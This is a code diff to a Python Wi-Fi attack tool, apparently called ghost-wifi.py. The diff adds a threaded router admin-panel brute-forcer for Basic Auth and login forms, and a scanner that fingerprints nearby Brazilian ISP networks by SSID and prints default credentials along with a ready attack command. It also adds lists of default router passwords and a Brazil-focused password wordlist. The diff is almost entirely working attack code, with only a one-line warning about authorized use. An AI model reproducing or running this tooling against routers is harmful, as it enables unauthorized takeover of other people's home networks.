@@ -36,7 +36,7 @@ R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
 B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
 W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
 
-VERSAO = "3.3.0"
+VERSAO = "3.4.0"
 
 
 def _build_banner():
@@ -3712,14 +3712,384 @@ def cmd_live_scan(args):
         save_json({"unique_aps": seen_list, "total": len(seen_bssids)}, args.output)
 
 
-# ─── Built-in mini wordlist ───────────────────────────────────────────────────
+# ─── Brazilian ISP/Router credential database ─────────────────────────────────
+
+_ISP_PATTERNS = {
+    "net_":       ("Claro/NET",       ["Sagemcom F@ST", "Technicolor"],   [("admin","admin"), ("admin","Net12345"), ("admin","claro")]),
+    "claro":      ("Claro",           ["Sagemcom", "ZTE", "Technicolor"], [("admin","admin"), ("admin","claro123"), ("admin","Net12345")]),
+    "gigafibra":  ("Claro GigaFibra", ["Nokia XS-250X"],                  [("admin","admin"), ("admin","Net@2023")]),
+    "vivo":       ("Vivo",            ["Sagemcom", "Askey", "Nokia"],     [("admin","admin"), ("admin","vivo"), ("user","user")]),
+    "gvt":        ("Vivo/GVT",        ["Technicolor", "Askey"],           [("admin","admin"), ("admin","vivo1234"), ("admin","GVT@2023")]),
+    "oi_":        ("Oi",              ["Technicolor", "ZTE"],             [("admin","admin"), ("admin","oi12345"), ("oi","oi")]),
+    "oifibra":    ("Oi Fibra",        ["Nokia", "Datacom"],               [("admin","admin"), ("admin","oifibra")]),
+    "tim_":       ("TIM",             ["Intelbras", "ZTE"],               [("admin","admin"), ("admin","tim12345")]),
+    "intelbras":  ("Intelbras",       ["Intelbras W5-1200F", "ACtion"],   [("admin","admin"), ("admin","intelbras"), ("admin","")]),
+    "brt-":       ("Vivo/GVT BRT",    ["Sagemcom BRT"],                   [("admin","admin"), ("admin","1234")]),
+    "multilaser": ("Multilaser",      ["Multilaser RE163V"],              [("admin","admin"), ("admin","multilaser")]),
+    "elsys":      ("Elsys",           ["Elsys ERP"],                      [("admin","admin"), ("admin","elsys"), ("admin","1234")]),
+    "mikrotik":   ("Mikrotik",        ["Mikrotik hAP"],                   [("admin",""), ("admin","admin"), ("admin","1234")]),
+    "speedtotal": ("SpeedTotal",      ["Datacom"],                        [("admin","admin"), ("admin","datacom")]),
+    "gwt":        ("GWTel",           ["GWTel ONU"],                      [("admin","admin"), ("admin","gwt123"), ("admin","1234")]),
+    "copel":      ("Copel Telecom",   ["Datacom", "Huawei"],              [("admin","admin"), ("admin","copel")]),
+    "algar":      ("Algar Telecom",   ["Intelbras", "ZTE"],               [("admin","admin"), ("admin","algar")]),
+}
+
+_ROUTER_PATHS = [
+    "/",
+    "/login",
+    "/admin",
+    "/admin/login",
+    "/cgi-bin/luci",
+    "/cgi-bin/login.cgi",
+    "/login.asp",
+    "/login.cgi",
+    "/index.cgi",
+    "/logon.htm",
+    "/webpages/login.html",
+    "/HNAP1/",
+    "/ui/login",
+    "/html/login.html",
+]
+
+_ROUTER_DEFAULTS = [
+    ("admin",  "admin"),
+    ("admin",  ""),
+    ("admin",  "1234"),
+    ("admin",  "12345"),
+    ("admin",  "123456"),
+    ("admin",  "password"),
+    ("admin",  "admin123"),
+    ("root",   "admin"),
+    ("root",   "root"),
+    ("root",   ""),
+    ("user",   "user"),
+    ("admin",  "0000"),
+    ("admin",  "1111"),
+    ("admin",  "Net12345"),
+    ("admin",  "claro"),
+    ("admin",  "claro123"),
+    ("admin",  "Net@2023"),
+    ("admin",  "vivo"),
+    ("admin",  "vivo1234"),
+    ("admin",  "GVT@2023"),
+    ("admin",  "oi12345"),
+    ("oi",     "oi"),
+    ("admin",  "tim12345"),
+    ("admin",  "intelbras"),
+    ("admin",  "smcadmin"),
+    ("admin",  "motorola"),
+    ("admin",  "multilaser"),
+    ("admin",  "elsys"),
+    ("admin",  "gwt123"),
+    ("admin",  "1234567890"),
+]
+
+
+def _router_http(host, port, path, method="GET", body=None, headers=None, timeout=5, scheme="http"):
+    import http.client
+    import ssl as _ssl
+    hdrs = {"User-Agent": "Mozilla/5.0", "Connection": "close"}
+    if headers:
+        hdrs.update(headers)
+    try:
+        if scheme == "https":
+            ctx = _ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
+        else:
+            conn = http.client.HTTPConnection(host, port, timeout=timeout)
+        conn.request(method, path, body=body, headers=hdrs)
+        r = conn.getresponse()
+        body_data = r.read(4096)
+        conn.close()
+        return r.status, dict(r.getheaders()), body_data.decode(errors="replace")
+    except Exception:
+        return 0, {}, ""
+
+
+def _detect_router_login(host, port, scheme="http"):
+    for path in _ROUTER_PATHS:
+        status, hdrs, body = _router_http(host, port, path, scheme=scheme)
+        if status == 0:
+            continue
+        if status == 401:
+            auth_hdr = hdrs.get("WWW-Authenticate", hdrs.get("www-authenticate", ""))
+            realm = re.search(r'realm="([^"]*)"', auth_hdr)
+            return (path, "basic", realm.group(1) if realm else "")
+        if status in (200, 301, 302):
+            if re.search(r'<form|input.*password|type=["\']?password', body, re.IGNORECASE):
+                action_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.IGNORECASE)
+                form_action = action_m.group(1) if action_m else path
+                if form_action and not form_action.startswith("/"):
+                    form_action = path.rstrip("/") + "/" + form_action
+                user_m = re.search(r'<input[^>]*name=["\']([^"\']*(?:user|login|usr|email)[^"\']*)["\']', body, re.IGNORECASE)
+                pass_m = re.search(r'<input[^>]*(?:type=["\']password["\'][^>]*name=["\']([^"\']+)["\']|name=["\']([^"\']+)["\'][^>]*type=["\']password["\'])', body, re.IGNORECASE)
+                uf = user_m.group(1) if user_m else "username"
+                pf = (pass_m.group(1) or pass_m.group(2)) if pass_m else "password"
+                return (path, "form", form_action or path, uf, pf)
+            if status in (301, 302):
+                loc = hdrs.get("Location", hdrs.get("location", ""))
+                if "login" in loc.lower() or "admin" in loc.lower():
+                    return (path, "redirect", loc, "", "")
+    return None
+
+
+def _try_basic_auth(host, port, path, user, pwd, scheme="http", timeout=5):
+    import base64
+    cred = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+    status, hdrs, body = _router_http(host, port, path, headers={"Authorization": f"Basic {cred}"}, scheme=scheme, timeout=timeout)
+    if status == 200:
+        if not re.search(r'invalid|incorrect|error|unauthorized|login', body[:800], re.IGNORECASE):
+            return True, body
+    if status in (301, 302):
+        loc = hdrs.get("Location", hdrs.get("location", ""))
+        if "logout" in loc.lower() or "index" in loc.lower() or "dashboard" in loc.lower() or "status" in loc.lower():
+            return True, body
+    return False, body
+
+
+def _try_form_auth(host, port, form_path, user_field, pass_field, user, pwd, scheme="http", timeout=5):
+    import urllib.parse
+    body_enc = urllib.parse.urlencode({user_field: user, pass_field: pwd})
+    status, hdrs, rbody = _router_http(
+        host, port, form_path, method="POST", body=body_enc,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        scheme=scheme, timeout=timeout
+    )
+    if status in (301, 302):
+        loc = hdrs.get("Location", hdrs.get("location", ""))
+        if loc and "login" not in loc.lower() and "error" not in loc.lower():
+            return True, rbody
+    if status == 200:
+        if re.search(r'logout|dashboard|welcome|status|success|home\.html', rbody[:2000], re.IGNORECASE):
+            if not re.search(r'invalid|incorrect|failed|wrong|erro', rbody[:500], re.IGNORECASE):
+                return True, rbody
+    return False, rbody
+
+
+def _router_brute_target(host, ports, creds, timeout=5, verbose=False):
+    result = {"target": host, "pwned": False, "cred": None, "port": None, "path": None, "scheme": None}
+    for port, scheme in ports:
+        login_info = _detect_router_login(host, port, scheme)
+        if not login_info:
+            continue
+        path = login_info[0]
+        auth_type = login_info[1]
+        if verbose:
+            info(f"  {host}:{port} - login em {path} (tipo: {auth_type})")
+        for user, pwd in creds:
+            try:
+                if auth_type == "basic":
+                    ok_flag, body = _try_basic_auth(host, port, path, user, pwd, scheme, timeout)
+                elif auth_type == "form":
+                    form_action = login_info[2]
+                    uf = login_info[3] if len(login_info) > 3 else "username"
+                    pf = login_info[4] if len(login_info) > 4 else "password"
+                    ok_flag, body = _try_form_auth(host, port, form_action, uf, pf, user, pwd, scheme, timeout)
+                else:
+                    continue
+                if ok_flag:
+                    result.update({"pwned": True, "cred": (user, pwd), "port": port, "path": path, "scheme": scheme})
+                    return result
+            except Exception:
+                continue
+    return result
+
+
+def cmd_router_brute(args):
+    """HTTP brute-force em painel admin de roteador (Basic Auth e form-based)."""
+    if not args.no_banner:
+        print_banner()
+    warn("Use apenas em redes/equipamentos proprios ou com autorizacao expressa.")
+
+    targets_raw = []
+    if getattr(args, "target", None):
+        targets_raw = [args.target]
+    elif getattr(args, "targets_file", None):
+        with open(args.targets_file) as f:
+            targets_raw = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+    else:
+        out, _, _ = run("ip route show default 2>/dev/null")
+        gw = re.search(r"default via (\S+)", out)
+        if gw:
+            targets_raw = [gw.group(1)]
+            info(f"Gateway detectado automaticamente: {targets_raw[0]}")
+        else:
+            err("Nenhum alvo especificado e gateway nao detectado. Use --target ou --targets-file.")
+            return
+
+    creds = list(_ROUTER_DEFAULTS)
+    if getattr(args, "wordlist", None) and os.path.exists(args.wordlist):
+        with open(args.wordlist) as f:
+            extras = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+        creds += [("admin", p) for p in extras] + [("root", p) for p in extras] + [("user", p) for p in extras]
+        info(f"Wordlist carregada: {len(extras)} senhas adicionais")
+
+    if getattr(args, "user", None) and getattr(args, "password", None):
+        creds = [(args.user, args.password)] + creds
+    elif getattr(args, "user", None):
+        creds = [(args.user, p) for _, p in creds]
+    elif getattr(args, "password", None):
+        creds = [(u, args.password) for u, _ in creds]
+
+    port_scheme = [(80, "http"), (8080, "http"), (443, "https"), (8443, "https")]
+    if getattr(args, "port", None):
+        port_scheme = [(args.port, "http"), (args.port, "https")]
+
+    threads = getattr(args, "threads", 5)
+    timeout = getattr(args, "timeout", 5)
+    pwned = []
+
+    info(f"Alvos: {len(targets_raw)} | Credenciais: {len(creds)} | Threads: {threads}")
+
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        futs = {ex.submit(_router_brute_target, h, port_scheme, creds, timeout, args.verbose): h for h in targets_raw}
+        done = 0
+        for fut in as_completed(futs):
+            done += 1
+            h = futs[fut]
+            try:
+                r = fut.result()
+            except Exception as e:
+                r = {"target": h, "pwned": False, "cred": None}
+            pct = int(done / len(targets_raw) * 100)
+            if r.get("pwned"):
+                u, pw = r["cred"]
+                ok(f"[{pct}%] COMPROMETIDO  {r['target']}:{r['port']}  user={u}  pass={pw!r}  path={r['path']}")
+                pwned.append(r)
+            else:
+                if args.verbose:
+                    warn(f"[{pct}%] Sem credenciais validas: {h}")
+                else:
+                    print(f"\r  {DIM}[{pct}%] Testando: {done}/{len(targets_raw)}{RST}", end="", flush=True)
+
+    print()
+    ok(f"Concluido. {len(pwned)}/{len(targets_raw)} roteadores comprometidos.")
+    if pwned:
+        print(f"\n{W}Roteadores comprometidos:{RST}")
+        for r in pwned:
+            u, pw = r["cred"]
+            print(f"  {G}[+]{RST} {r['scheme']}://{r['target']}:{r['port']}{r['path']}  {u}:{pw}")
+    if args.output:
+        save_json({"pwned": pwned, "total": len(targets_raw)}, args.output)
+
+
+# ─── Module: isp-scan (fingerprint de ISP/roteador por padrao de SSID) ────────
+
+def cmd_isp_scan(args):
+    """Detecta ISP e modelo de roteador brasileiro por padroes de SSID. Exibe credenciais padrao sugeridas."""
+    if not args.no_banner:
+        print_banner()
+    require_root()
+    require_tool("airodump-ng")
+    mon = getattr(args, "interface", None)
+    if not mon:
+        mons = get_monitor_interfaces()
+        if not mons:
+            err("Nenhuma interface monitor. Execute: ghost-wifi.py monitor -i wlan0 --action start")
+            sys.exit(1)
+        mon = mons[0]
+
+    duration = getattr(args, "duration", 20) or 20
+    info(f"Escaneando padroes ISP em {mon} por {duration}s...")
+    out_prefix = "/tmp/ghost_isp_" + str(os.getpid())
+    proc = subprocess.Popen(
+        f"airodump-ng {mon} --write {out_prefix} --output-format csv -a",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    try:
+        time.sleep(duration)
+    finally:
+        proc.terminate()
+        proc.wait()
+
+    csv_file = f"{out_prefix}-01.csv"
+    if not os.path.exists(csv_file):
+        err("Sem saida de scan.")
+        return
+
+    aps, _ = _parse_airodump_csv(csv_file)
+    for f in Path("/tmp").glob(f"ghost_isp_{os.getpid()}*"):
+        try: f.unlink()
+        except: pass
+
+    if not aps:
+        warn("Nenhuma rede encontrada.")
+        return
+
+    matched = []
+    for ap in aps:
+        essid = ap.get("essid", "").strip()
+        essid_l = essid.lower()
+        for pattern, (isp_name, routers, creds) in _ISP_PATTERNS.items():
+            if pattern in essid_l:
+                matched.append({**ap, "isp": isp_name, "routers": routers, "creds": creds, "pattern": pattern})
+                break
+
+    matched.sort(key=lambda x: int(x["power"]) if x.get("power","").lstrip("-").isdigit() else -100, reverse=True)
+    unmatched = [a for a in aps if a not in matched]
+    unmatched.sort(key=lambda x: int(x["power"]) if x.get("power","").lstrip("-").isdigit() else -100, reverse=True)
+
+    print(f"\n{W}ISP/Router Fingerprint Scan - {len(aps)} redes{RST}\n")
+
+    if matched:
+        print(f"{G}Redes ISP identificadas ({len(matched)}):{RST}")
+        print(f"{W}{'BSSID':<19} {'CH':<4} {'SIG':<8} {'ISP':<18} {'ROTEADOR PROVAVEL':<24} {'ESSID'}{RST}")
+        print("-" * 100)
+        for ap in matched:
+            bar = _signal_bar(ap.get("power","0"), width=5)
+            router_hint = ap["routers"][0][:22] if ap["routers"] else "desconhecido"
+            print(f"  {ap['bssid']:<19} {ap.get('channel',''):<4} {bar} {ap.get('power',''):<5} {ap['isp']:<18} {DIM}{router_hint:<24}{RST} {ap['essid']}")
+
+        print(f"\n{Y}Credenciais padrao sugeridas por ISP:{RST}")
+        seen_isps: dict = {}
+        for ap in matched:
+            isp = ap["isp"]
+            if isp not in seen_isps:
+                seen_isps[isp] = ap["creds"]
+                print(f"\n  {W}{isp}:{RST}")
+                for u, p in ap["creds"]:
+                    print(f"    {G}usuario:{RST} {u:<12} {G}senha:{RST} {p!r}")
+                gw_hint = "192.168.0.1 ou 192.168.1.1"
+                print(f"  {DIM}Ataque: ghost-wifi.py router-brute --target {gw_hint}{RST}")
+
+    if unmatched:
+        print(f"\n{DIM}Outras redes ({len(unmatched)}) - sem padrao ISP reconhecido:{RST}")
+        for ap in unmatched[:15]:
+            bar = _signal_bar(ap.get("power","0"), width=4)
+            essid_disp = ap.get("essid","") or f"{DIM}[oculta]{RST}"
+            print(f"  {DIM}{ap['bssid']:<19} ch{ap.get('channel',''):<3} {bar} {essid_disp}{RST}")
+        if len(unmatched) > 15:
+            print(f"  {DIM}... {len(unmatched)-15} mais{RST}")
+
+    ok(f"ISP scan concluido: {len(matched)} identificadas, {len(unmatched)} desconhecidas")
+
+    if args.output:
+        save_json({
+            "matched": [{k: v for k, v in a.items() if k not in ("creds",)} for a in matched],
+            "unmatched": [{"bssid": a.get("bssid",""), "essid": a.get("essid",""), "channel": a.get("channel","")} for a in unmatched],
+            "total": len(aps)
+        }, args.output)
+
+
+# ─── Built-in mini wordlist (BR-focused) ─────────────────────────────────────
 
 MINI_WORDLIST = [
-    "password", "12345678", "123456789", "1234567890", "password1",
-    "qwerty123", "abc123456", "letmein1", "monkey123", "dragon123",
-    "admin", "admin123", "root", "toor", "pass", "test", "12345",
-    "password123", "iloveyou", "sunshine", "princess", "welcome",
-    "shadow", "master", "batman", "superman", "1q2w3e4r",
+    # Universais
+    "admin", "admin123", "password", "12345678", "123456789",
+    "1234567890", "password1", "qwerty123", "abc123456",
+    # Brasileiras comuns
+    "brasil123", "brasil", "minhasenha", "minharede",
+    "wifi123", "internet", "internet123", "senha123",
+    "casa123", "wifi2024", "wifi2025", "wifi2026",
+    "12345678", "11111111", "00000000", "88888888",
+    # ISPs BR
+    "claro123", "vivo1234", "oi12345", "tim12345",
+    "Net12345", "intelbras", "admin1234",
+    # Nomes + ano
+    "joao2024", "maria2024", "pedro2025",
 ]
 
 # ─── Argument Parser ──────────────────────────────────────────────────────────
@@ -4029,6 +4399,21 @@ def build_parser():
     ls.add_argument("--band", choices=["a", "b", "abg"], help="Band filter")
     ls.add_argument("-o", "--output", help="Save unique AP list to JSON on exit")
 
+    # v3.4.0 - router brute-force and ISP fingerprint
+    rb = sub.add_parser("router-brute", help="HTTP brute-force em painel admin de roteador (Basic Auth + form)")
+    rb.add_argument("--target", help="IP ou hostname alvo (detecta gateway automaticamente se omitido)")
+    rb.add_argument("--targets-file", dest="targets_file", help="Arquivo com um alvo por linha")
+    rb.add_argument("--user", help="Usuario fixo (padrao: testa admin/root/user)")
+    rb.add_argument("--password", help="Senha unica para testar")
+    rb.add_argument("--wordlist", help="Wordlist de senhas (complementa os defaults embutidos)")
+    rb.add_argument("--port", type=int, help="Porta especifica (padrao: testa 80,8080,443,8443)")
+    rb.add_argument("--threads", type=int, default=5, help="Threads paralelas (padrao: 5)")
+    rb.add_argument("--timeout", type=int, default=5, help="Timeout por requisicao em segundos (padrao: 5)")
+
+    isp = sub.add_parser("isp-scan", help="Detecta ISP/roteador BR por padroes de SSID com credenciais padrao")
+    isp.add_argument("-i", "--interface", help="Interface monitor (auto-detecta se omitida)")
+    isp.add_argument("--duration", type=int, default=20, help="Duracao do scan em segundos (padrao: 20)")
+
     return p
 
 # ─── Entry point ──────────────────────────────────────────────────────────────
@@ -4077,6 +4462,9 @@ COMMANDS = {
     "arp-mitm":        cmd_arp_mitm,
     "handshake-hunt":  cmd_handshake_hunt,
     "dns-spoof":       cmd_dns_spoof,
+    # v3.4.0 - router attack and ISP fingerprint
+    "router-brute":    cmd_router_brute,
+    "isp-scan":        cmd_isp_scan,
 }
 
 def main():
